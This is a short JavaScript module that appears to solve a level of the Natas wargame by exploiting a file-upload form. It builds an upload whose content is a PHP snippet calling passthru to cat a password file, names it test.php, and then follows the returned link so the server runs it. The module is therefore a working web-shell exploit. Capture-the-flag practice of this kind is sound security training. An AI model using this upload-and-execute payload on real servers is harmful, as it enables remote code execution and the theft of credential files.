exports.getDynamicOptions = (options,response)=>{
    if(response){
        const newUrl = response.data.match(/<a href="(.+)">upload/)[1];
        options.url += "/"+newUrl;
    }else{
        options.body.uploadedfile = {
            isFile : true,
            content:`pass: <? print passthru("cat /etc/natas_webpass/natas13"); ?>`,
            fileName:"test.php",
            fileType: "text/plain"
        };
    }

    return options;
}